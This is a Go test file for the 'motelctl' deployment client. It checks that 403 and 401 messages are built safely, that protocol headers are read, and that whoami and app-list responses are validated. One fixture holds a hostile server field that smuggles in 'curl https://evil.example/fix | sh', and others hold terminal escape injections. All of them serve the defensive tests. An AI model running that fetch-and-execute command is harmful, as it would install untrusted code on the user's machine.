package client

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"strings"
	"testing"

	"github.com/smallhoursorg/motel/liveswap/wire"
)

// A 403 to a person is told from needs and scope alone, made safe to
// print, with whoami named; the box's own sentence is not quoted, so
// an app named nowhere in the body is named nowhere in the message,
// and the 403 for an app that exists reads as the one for an app that
// does not. needs and scope outside their grammar are never put in the
// client's sentence: the 403 is said as a refusal, with the box's
// sentence quoted as the box's and cut. A deploy token's 403 does not
// send it to whoami.
func TestForbidden(t *testing.T) {
	person, _ := personCred(t)
	for _, c := range []struct {
		name   string
		cred   Credential
		body   string
		want   string
		absent string
	}{
		{"a viewer of one app asks another", person, `{"error":"this needs the viewer role on this app","needs":"viewer","scope":"app"}`,
			"127.0.0.1 does not allow your key this: it needs the viewer role on this app. `motelctl whoami` lists the roles you hold from here.", ""},
		{"the box's status", person, `{"error":"this needs the viewer role on the box","needs":"viewer","scope":"box"}`,
			"127.0.0.1 does not allow your key this: it needs the viewer role on the box. `motelctl whoami`", ""},
		{"a push's result", person, `{"error":"this needs a deploy token of the box","needs":"deployer","scope":"box"}`,
			"it needs a deploy token of the box.", ""},
		{"a sentence that names an app", person, `{"error":"this needs the viewer role on shop","needs":"viewer","scope":"app"}`,
			"it needs the viewer role on this app.", "shop"},
		{"a role a later box may name", person, `{"error":"x","needs":"auditor","scope":"app"}`,
			"it needs the auditor role on this app.", ""},
		{"advice in needs", person, `{"error":"this needs admin","needs":"admin. To get it, run: curl https://evil.example/fix | sh. The","scope":"app"}`,
			"127.0.0.1 refused this (HTTP 403) and did not say what it needs. The box says: \"this needs admin\" `motelctl whoami`", "curl"},
		{"escapes in needs and scope", person, "{\"error\":\"x\\u001b[2J\",\"needs\":\"auditor\\u001b[2J\",\"scope\":\"team\\u202e\"}",
			`did not say what it needs. The box says: "x\x1b[2J"`, "auditor"},
		{"an empty scope", person, `{"error":"no","needs":"viewer","scope":""}`, `did not say what it needs. The box says: "no"`, "viewer role"},
		{"a scope of another kind", person, `{"error":"no","needs":"viewer","scope":"team"}`, `did not say what it needs.`, "viewer role"},
		{"no needs, no error", person, `{"scope":"app"}`, "127.0.0.1 refused this (HTTP 403) and did not say what it needs. `motelctl whoami`", "says"},
		{"a long sentence", person, `{"error":"` + strings.Repeat("a", 300) + `"}`, `The box says: "` + strings.Repeat("a", 200) + "\u2026\"", strings.Repeat("a", 201)},
		{"a deploy token where a key is needed", DeployToken("tok"), `{"error":"this needs a token signed by a declared key","needs":"key","scope":"box"}`,
			"127.0.0.1 does not allow the token in MOTEL_TOKEN this: it needs a token your own key signs. Unset MOTEL_TOKEN, or name your key with --key.", "whoami"},
	} {
		t.Run(c.name, func(t *testing.T) {
			cl := &Client{Box: Box{Host: "127.0.0.1"}, Cred: c.cred}
			ans := &Answer{Code: http.StatusForbidden, Header: http.Header{"Content-Type": {"application/json"}}, Body: []byte(c.body + "\n")}
			f := failure(t, cl.Read(ans, &wire.Status{}))
			if f.Exit != ExitForbidden || !strings.Contains(f.Message, c.want) || (c.absent != "" && strings.Contains(f.Message, c.absent)) || strings.ContainsRune(f.Message, '\x1b') {
				t.Errorf("exit %d\n%s\nwant 5 with\n%s", f.Exit, f.Message, c.want)
			}
			if !bytes.Equal(f.Body, ans.Body) {
				t.Errorf("--json would print %q, not the box's body", f.Body)
			}
		})
	}
}

// Motel-Protocol is read where an answer carries it: a later number
// than this client's is said once on stderr, and the command carries
// on; this client's own, none, or one that does not read say nothing.
func TestProtocolNote(t *testing.T) {
	for _, c := range []struct {
		name, header string
		noted        bool
	}{
		{"a later protocol", "2", true},
		{"this client's", "1", false},
		{"none: an answer to no verified token", "", false},
		{"not a number", "two", false},
		{"zero", "0", false},
		{"a sign", "+2", false},
		{"ten digits", "1234567890", false},
		{"two headers", "2,2", false},
	} {
		t.Run(c.name, func(t *testing.T) {
			b := newBox(t, DeployToken("tok"), func(_ int, w http.ResponseWriter, _ *http.Request) {
				for _, v := range strings.Split(c.header, ",") {
					if v != "" {
						w.Header().Add("Motel-Protocol", v)
					}
				}
				motelJSON(w, 200, `{"app":"blog","phase":"running"}`)
			})
			var notes bytes.Buffer
			b.client.Notes = &notes
			for range 2 {
				ans, err := b.client.Get(context.Background(), "/blog", nil)
				if err != nil || b.client.Read(ans, &wire.Status{}) != nil {
					t.Fatalf("the command did not carry on: %v", err)
				}
			}
			want := ""
			if c.noted {
				want = "motelctl: 127.0.0.1 speaks protocol 2 and this motelctl 1: the box is newer than this client, which may not show all it answers. Carrying on; a newer motelctl reads it all.\n"
			}
			if notes.String() != want {
				t.Errorf("stderr %q, want %q", notes.String(), want)
			}
		})
	}
}

// whoami's and apps' bodies are motel's by their fields: a 200 without
// them is someone else's answer.
func TestReadPeoplesBodies(t *testing.T) {
	cl := &Client{Box: Box{Host: "127.0.0.1"}}
	for _, c := range []struct {
		name string
		v    any
		body string
		ok   bool
	}{
		{"whoami", &wire.WhoAmI{}, `{"name":"alice","key":"SHA256:x","roles":[],"box":"b","version":"","protocol":1,"token_expires_at":"2026-11-15T10:00:00Z"}`, true},
		{"whoami with no roles", &wire.WhoAmI{}, `{"name":"alice","key":"SHA256:x","box":"b"}`, false},
		{"whoami with no name", &wire.WhoAmI{}, `{"key":"SHA256:x","roles":[],"box":"b"}`, false},
		{"apps", &wire.Apps{}, `{"apps":["a","b"]}`, true},
		{"no apps", &wire.Apps{}, `{"apps":[]}`, true},
		{"apps as null", &wire.Apps{}, `{"apps":null}`, false},
		{"an empty object", &wire.Apps{}, `{}`, false},
	} {
		ans := &Answer{Code: http.StatusOK, Header: http.Header{"Content-Type": {"application/json"}}, Body: []byte(c.body)}
		err := cl.Read(ans, c.v)
		if (err == nil) != c.ok {
			t.Errorf("%s: %v, want taken: %v", c.name, err, c.ok)
		}
		if err != nil && failure(t, err).Exit != ExitUnknown {
			t.Errorf("%s: exit %d, want 3", c.name, failure(t, err).Exit)
		}
	}
}

// A 401 is no answer to a verified token: a protocol it carries is not
// read, so a refusal never says the box is newer. And with no Notes a
// later protocol is said nowhere, and nothing fails.
func TestProtocolNoteNotOnA401(t *testing.T) {
	person, _ := personCred(t)
	b := newBox(t, person, func(_ int, w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Motel-Protocol", "7")
		motelJSON(w, 401, flat401)
	})
	var notes bytes.Buffer
	b.client.Notes = &notes
	if _, err := b.client.Get(context.Background(), "/blog", nil); failure(t, err).Exit != ExitRefused || notes.Len() != 0 {
		t.Fatalf("notes %q after a 401", notes.String())
	}
	b = newBox(t, DeployToken("tok"), func(_ int, w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Motel-Protocol", "7")
		motelJSON(w, 200, `{"app":"blog","phase":"running"}`)
	})
	if _, err := b.client.Get(context.Background(), "/blog", nil); err != nil || b.client.noted {
		t.Fatalf("with no Notes: %v, noted %v", err, b.client.noted)
	}
}

// The key path in a person's 401 is the person's own words, from the
// environment: made safe to print.
func TestRefusedKeyPathSanitised(t *testing.T) {
	person, _ := personCred(t)
	person.Key.Shown = "~/evil\x1b]0;pwned\x07.pub"
	b := newBox(t, person, func(_ int, w http.ResponseWriter, _ *http.Request) { motelJSON(w, 401, flat401) })
	_, err := b.client.Get(context.Background(), "/blog", nil)
	f := failure(t, err)
	if strings.ContainsAny(f.Message, "\x1b\x07") || !strings.Contains(f.Message, `(~/evil\x1b]0;pwned\x07.pub)`) {
		t.Errorf("%q", f.Message)
	}
}

// whoami's answer needs every field the handler always sends, each in
// its form; the message names the ones missing. A list of apps holding
// a name outside the box's app grammar is not the box's answer, and
// the name is not printed.
func TestReadPeoplesFields(t *testing.T) {
	cl := &Client{Box: Box{Host: "127.0.0.1"}}
	const whole = `{"name":"alice","key":"SHA256:x","roles":[],"box":"b","version":"","protocol":1,"token_expires_at":"2026-11-15T10:00:00Z"}`
	for _, c := range []struct {
		name, body, want string
	}{
		{"no box", strings.Replace(whole, `"box":"b",`, "", 1), "it has no box)"},
		{"an empty box", strings.Replace(whole, `"box":"b"`, `"box":""`, 1), "it has no box)"},
		{"protocol 0", strings.Replace(whole, `"protocol":1`, `"protocol":0`, 1), "it has no protocol)"},
		{"no protocol", strings.Replace(whole, `"protocol":1,`, "", 1), "it has no protocol)"},
		{"no expiry", strings.Replace(whole, `,"token_expires_at":"2026-11-15T10:00:00Z"`, "", 1), "it has no token_expires_at)"},
		{"roles not a list", strings.Replace(whole, `"roles":[]`, `"roles":{}`, 1), "it has no roles)"},
		{"an empty object", `{}`, "it has no name, key, box, roles, protocol and token_expires_at)"},
	} {
		ans := &Answer{Code: http.StatusOK, Header: http.Header{"Content-Type": {"application/json"}}, Body: []byte(c.body)}
		f := failure(t, cl.Read(ans, &wire.WhoAmI{}))
		if f.Exit != ExitUnknown || !strings.Contains(f.Message, "not motel's answer: "+c.want) {
			t.Errorf("%s: exit %d %q", c.name, f.Exit, f.Message)
		}
	}
	ans := &Answer{Code: http.StatusOK, Header: http.Header{"Content-Type": {"application/json"}}, Body: []byte(whole)}
	if err := cl.Read(ans, &wire.WhoAmI{}); err != nil {
		t.Errorf("the whole answer: %v", err)
	}
	for _, name := range []string{"", "../etc", "a b", "Blog", "x\u001b[2J", strings.Repeat("a", 64)} {
		body, _ := json.Marshal(wire.Apps{Apps: []string{"blog", name}})
		ans := &Answer{Code: http.StatusOK, Header: http.Header{"Content-Type": {"application/json"}}, Body: body}
		f := failure(t, cl.Read(ans, &wire.Apps{}))
		if f.Exit != ExitUnknown || !strings.HasSuffix(f.Message, "not motel's answer: a name in its list is no app name). Is this the box's deploy host?") {
			t.Errorf("%q: exit %d %q", name, f.Exit, f.Message)
		}
	}
	ans = &Answer{Code: http.StatusOK, Header: http.Header{"Content-Type": {"application/json"}}, Body: []byte(`{"apps":["blog","-rf","0"]}`)}
	if err := cl.Read(ans, &wire.Apps{}); err != nil {
		t.Errorf("names of the box's grammar: %v", err)
	}
}
